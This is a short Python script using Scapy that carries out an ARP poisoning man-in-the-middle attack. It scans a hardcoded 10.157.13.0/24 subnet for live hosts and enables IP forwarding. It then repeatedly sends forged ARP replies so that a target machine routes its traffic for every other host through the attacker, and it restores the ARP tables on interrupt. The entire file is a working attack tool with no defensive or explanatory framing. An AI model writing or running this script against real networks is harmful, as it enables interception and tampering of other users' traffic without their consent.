from scapy.all import *
import os, signal, sys, time

def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None


# get target IP from argv[1]
if len(sys.argv) < 2:
    print "usage: ./prog <target IP>"
    sys.exit(0)

target_ip = sys.argv[1]
print "Target IP: {}".format(target_ip)

#ARP Poison parameters
conf.iface = "enp0s25"
conf.verb = 0

# get all IPs in the network
print("scan network for living hosts...")
ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.157.13.0/24"),timeout=5)
hosts = dict()
for answer in ans.res:
    if(answer[0].pdst != target_ip and answer[0].pdst != "10.157.13.1"):
        hosts[answer[0].pdst] = get_mac(answer[0].pdst)
    
print("hosts alive:")
for ip in hosts:
    print("{}\t{}".format(ip, hosts[ip]))


# restore the network by reversing the ARP poison attack
def restore_network(target_ip):
    for ip in hosts:
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=hosts[ip], psrc=ip), count=5)
    
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net/ipv4/ip_forward=0")

# sending false ARP replies
def arp_poison(target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            for ip in hosts:
                # uses interface MAC address as hsrc
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=ip))
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("[*] Restoring network...")
        restore_network(target_ip)


# start attack
print("[*] starting attack")
print("[*] enabling IP forwarding")
os.system("sysctl -w net/ipv4/ip_forward=1")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: {}".format(target_mac))

# start arp poisoning
arp_poison(target_ip, target_mac)

